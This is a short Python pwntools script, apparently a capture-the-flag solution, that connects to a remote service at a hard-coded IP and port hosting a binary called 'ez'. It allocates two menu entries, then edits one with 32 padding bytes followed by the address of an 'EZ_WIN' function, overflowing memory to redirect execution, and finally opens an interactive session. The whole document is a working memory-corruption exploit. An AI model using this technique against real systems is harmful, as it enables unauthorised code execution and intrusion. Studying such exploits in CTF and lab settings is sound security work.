from pwn import *

elf = ELF('./ez')
p = remote('103.185.38.238', 15733)

rip = p64(elf.symbols['EZ_WIN'])
offset = 32
payload = b"".join(
    [
        b"A"*offset,
        rip
    ]
)

# win = hex(elf.symbols['EZ_WIN'])
# print(hex(elf.symbols['EZ_WIN'])) # 0x4014a0

# New meme 1
p.recv()
p.sendline('1')
p.recv()
p.sendline('4')
p.recv()
p.sendline('AA')

# New meme 2
p.recv()
p.sendline('1')
p.recv()
p.sendline('4')
p.recv()
p.sendline('AA')

# Edit meme 1
p.recv()
p.sendline('2')
p.recv()
p.sendline('0')
p.sendline(payload)

p.recv()
p.sendline('3')
p.recv()
p.sendline('1')

print(p.recv())

p.interactive()